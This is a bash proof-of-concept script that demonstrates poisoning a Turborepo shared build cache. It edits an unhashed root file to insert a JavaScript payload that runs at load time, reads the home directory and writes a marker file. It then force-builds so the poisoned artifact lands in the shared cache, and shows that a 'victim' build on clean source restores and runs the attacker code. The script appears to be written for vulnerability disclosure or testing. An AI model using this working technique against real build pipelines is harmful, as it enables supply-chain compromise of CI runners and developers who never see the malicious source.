#!/usr/bin/env bash
set -euo pipefail
CACHE=/tmp/turbo-shared-cache
cd /tmp/turbo-poc

line(){ printf '\n========== %s ==========\n' "$1"; }

# ---- reset to a clean, honest baseline ----
git checkout -- shared/brand.js
rm -rf "$CACHE" packages/lib/dist apps/web/dist .turbo
rm -f /tmp/PWNED_BY_CACHE.txt

line "STEP 1  main branch: clean build, populate shared remote cache"
npx turbo run build --cache-dir="$CACHE" 2>&1 | grep -Ei 'cache (miss|hit)|Tasks:|cached'
echo "-- run the produced app artifact --"
node apps/web/dist/index.js
echo "-- /tmp/PWNED_BY_CACHE.txt exists? $([ -f /tmp/PWNED_BY_CACHE.txt ] && echo YES || echo no) --"

line "STEP 2  attacker branch: edit ONLY the unhashed root file, force a build"
cat > shared/brand.js <<'EOF'
console.log("[brand] hello from the legit brand banner");
(() => {
  const fs = require("node:fs"), os = require("node:os");
  console.log("\x1b[31m[PWNED] arbitrary code executing inside the cached artifact\x1b[0m");
  try { console.log("[PWNED] can read $HOME ->", fs.readdirSync(os.homedir()).slice(0,3).join(", ")); } catch {}
  fs.writeFileSync("/tmp/PWNED_BY_CACHE.txt", "cache-poisoned artifact executed at load time\n");
})();
EOF
# Build from a fresh tree (no stale dist) so the attacker computes the SAME key the
# victim will. --force = execute even on hit, then write poisoned outputs to cache.
rm -rf packages/lib/dist apps/web/dist .turbo
npx turbo run build --force --cache-dir="$CACHE" 2>&1 | grep -Ei 'cache (miss|hit|bypass)|Tasks:|executing'
echo "-- attacker's poisoned cache entry is now in the shared cache --"

line "STEP 3  victim on clean main: restore clean source, fresh tree, pull from cache"
# Victim's source is byte-for-byte the committed (clean) main. They never see the payload.
git checkout -- shared/brand.js
echo "-- victim shared/brand.js (clean main, grep for payload): --"
grep -q PWNED shared/brand.js && echo "  !! payload present (unexpected)" || echo "  OK: no payload in victim source"
# Simulate a fresh pull on a CI runner / teammate machine: no local build outputs.
rm -rf packages/lib/dist apps/web/dist .turbo
rm -f /tmp/PWNED_BY_CACHE.txt
echo "-- victim builds, pointed at the shared (remote) cache --"
npx turbo run build --cache-dir="$CACHE" 2>&1 | grep -Ei 'cache (miss|hit)|Tasks:|replay|cached'

line "RESULT  victim never touched brand.js, but runs attacker code"
node apps/web/dist/index.js
echo "-- /tmp/PWNED_BY_CACHE.txt exists on victim? $([ -f /tmp/PWNED_BY_CACHE.txt ] && echo 'YES - POISONED' || echo no) --"

git checkout -- shared/brand.js
